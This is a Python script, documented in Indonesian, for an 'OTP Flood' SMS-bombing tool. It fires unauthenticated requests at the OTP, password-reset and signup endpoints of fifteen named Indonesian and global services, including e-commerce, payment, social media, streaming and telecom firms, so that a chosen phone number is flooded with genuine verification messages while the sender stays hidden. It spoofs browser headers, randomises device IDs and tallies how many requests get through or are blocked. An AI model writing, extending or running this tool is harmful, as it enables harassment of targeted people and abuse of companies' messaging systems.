"""
OTP Flood - OTP Trigger Mode (GRATIS TOTAL)

Cara kerja:
- Tools ngetrigger endpoint "Lupa Password" / "Daftar" / "Request OTP" dari berbagai brand
- Brand yang kirim OTP beneran ke nomor target
- Lo cuma trigger. Brand bayar bandwidth. Lo gratis.
- Nomor lo GAK KELIATAN. Target liat OTP dari brand beneran.

Mekanisme:
HTTP POST/GET ke endpoint publik brand.
Gak perlu auth. Gak perlu API key. Gak perlu bayar.
"""

import requests
import json
import time
import random
import urllib3

# Matikan SSL warning untuk endpoint yang pake self-signed cert
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class OTPTrigger:
    """
    Trigger OTP dari brand beneran.
    Target nerima OTP dari brand, bukan dari lo.
    """

    def __init__(self, target_number):
        self.target = self._format(target_number)
        self.sent_count = 0
        self.block_count = 0
        self.error_count = 0
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://www.tokopedia.com",
            "Referer": "https://www.tokopedia.com/",
        })

    def _format(self, n):
        n = n.strip().replace("+", "").replace(" ", "").replace("-", "")
        if n.startswith("0"):
            n = "62" + n[1:]
        return n

    def _phone(self):
        """Return phone in 08xx format (Indonesia)"""
        if self.target.startswith("62"):
            return "0" + self.target[2:]
        return self.target

    # ============================================================
    # E-COMMERCE
    # ============================================================

    def trigger_tokopedia(self):
        url = "https://api.tokopedia.com/v1/forget-password/send-otp"
        data = {"phone": self._phone(), "source": "web"}
        try:
            r = self.session.post(url, json=data, timeout=10, verify=False)
            if r.status_code in (200, 201):
                return "sent"
            return "blocked" if "block" in r.text.lower() else "error"
        except: return "error"

    def trigger_shopee(self):
        url = "https://shopee.co.id/api/v2/authentication/send_otp"
        data = {"phone": self.target, "type": 1, "country_code": "62"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "rate" in r.text.lower() else "error"
        except: return "error"

    def trigger_lazada(self):
        url = "https://member.lazada.co.id/api/send-otp"
        data = {"phone": self._phone(), "type": "register"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code in (200, 201):
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_bukalapak(self):
        url = "https://api.bukalapak.com/v2/otp/generate.json"
        data = {"phone": self._phone(), "type": "login"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    # ============================================================
    # FINANCE / PAYMENT
    # ============================================================

    def trigger_gojek(self):
        url = "https://goid.gojekapi.com/v1/phone/request-otp"
        data = {"phone": self.target}
        headers = {"X-App-Version": "4.60.1", "X-Unique-Id": str(random.randint(100000, 999999))}
        try:
            r = self.session.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "rate" in r.text.lower() else "error"
        except: return "error"

    def trigger_grab(self):
        url = "https://api.grab.com/api/v1/phone/request-otp"
        data = {"phone": self.target, "countryCode": "ID"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_dana(self):
        url = "https://api.dana.id/sms/otp/v1/send"
        data = {"phone": self.target, "countryCode": "62"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code in (200, 201):
                return "sent"
            return "blocked" if "block" in r.text.lower() else "error"
        except: return "error"

    def trigger_ovo(self):
        url = "https://api.ovo.id/v1.0/otp/request"
        data = {"phone": self.target, "deviceId": str(random.randint(1000000000, 9999999999))}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_linkaja(self):
        url = "https://api.linkaja.com/v1/otp/request"
        data = {"phone": self._phone(), "channel": "sms"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    # ============================================================
    # SOCIAL MEDIA
    # ============================================================

    def trigger_instagram(self):
        url = "https://i.instagram.com/api/v1/accounts/send_two_factor_login_sms/"
        data = {"phone_number": self._phone(), "device_id": str(random.randint(1000000000, 9999999999))}
        headers = {"User-Agent": "Instagram 273.0.0.18.100 Android"}
        try:
            r = self.session.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "block" in r.text.lower() else "error"
        except: return "error"

    def trigger_facebook(self):
        url = "https://mbasic.facebook.com/mobile/register/"
        data = {"phone": self._phone(), "country": "ID", "source": "m_register"}
        try:
            r = self.session.post(url, data=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "block" in r.text.lower() else "error"
        except: return "error"

    # ============================================================
    # STREAMING
    # ============================================================

    def trigger_netflix(self):
        url = "https://www.netflix.com/id/login/sendOtp"
        data = {"phone": self._phone()}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_spotify(self):
        url = "https://www.spotify.com/id/api/otp/v1/send"
        data = {"phone": self._phone()}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    # ============================================================
    # TELCO
    # ============================================================

    def trigger_telkomsel(self):
        url = "https://api.telkomsel.com/otp/v1/request"
        data = {"msisdn": self._phone(), "channel": "sms"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_indosat(self):
        url = "https://api.indosat.com/otp/request"
        data = {"phone": self._phone(), "service": "im3"}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    # ============================================================
    # ALL BRANDS MAP
    # ============================================================

    BRANDS = {
        "tokopedia": {"name": "Tokopedia", "category": "e-commerce", "fn": trigger_tokopedia},
        "shopee": {"name": "Shopee", "category": "e-commerce", "fn": trigger_shopee},
        "lazada": {"name": "Lazada", "category": "e-commerce", "fn": trigger_lazada},
        "bukalapak": {"name": "Bukalapak", "category": "e-commerce", "fn": trigger_bukalapak},
        "gojek": {"name": "Gojek", "category": "finance", "fn": trigger_gojek},
        "grab": {"name": "Grab", "category": "finance", "fn": trigger_grab},
        "dana": {"name": "DANA", "category": "finance", "fn": trigger_dana},
        "ovo": {"name": "OVO", "category": "finance", "fn": trigger_ovo},
        "linkaja": {"name": "LinkAja", "category": "finance", "fn": trigger_linkaja},
        "instagram": {"name": "Instagram", "category": "social-media", "fn": trigger_instagram},
        "facebook": {"name": "Facebook", "category": "social-media", "fn": trigger_facebook},
        "netflix": {"name": "Netflix", "category": "streaming", "fn": trigger_netflix},
        "spotify": {"name": "Spotify", "category": "streaming", "fn": trigger_spotify},
        "telkomsel": {"name": "Telkomsel", "category": "telecom", "fn": trigger_telkomsel},
        "indosat": {"name": "Indosat", "category": "telecom", "fn": trigger_indosat},
    }

    CATEGORIES = {
        "e-commerce": ["tokopedia", "shopee", "lazada", "bukalapak"],
        "finance": ["gojek", "grab", "dana", "ovo", "linkaja"],
        "social-media": ["instagram", "facebook"],
        "streaming": ["netflix", "spotify"],
        "telecom": ["telkomsel", "indosat"],
    }

    class _color:
        RST = "\033[0m"
        DIM = "\033[2m"
        YLW = "\033[93m"
        GRN = "\033[92m"
        RED = "\033[91m"
        CYN = "\033[96m"
        MAG = "\033[35m"
        B = "\033[1m"

    def trigger(self, brand_key):
        """Trigger OTP for a specific brand. Returns status string."""
        brand = self.BRANDS.get(brand_key)
        if not brand:
            return "error"
        fn = brand["fn"]
        result = fn(self)
        
        if result == "sent":
            self.sent_count += 1
        elif result == "blocked":
            self.block_count += 1
        else:
            self.error_count += 1
        
        return result

    def get_stats(self):
        return {
            "target": self.target,
            "sent": self.sent_count,
            "blocked": self.block_count,
            "error": self.error_count,
        }
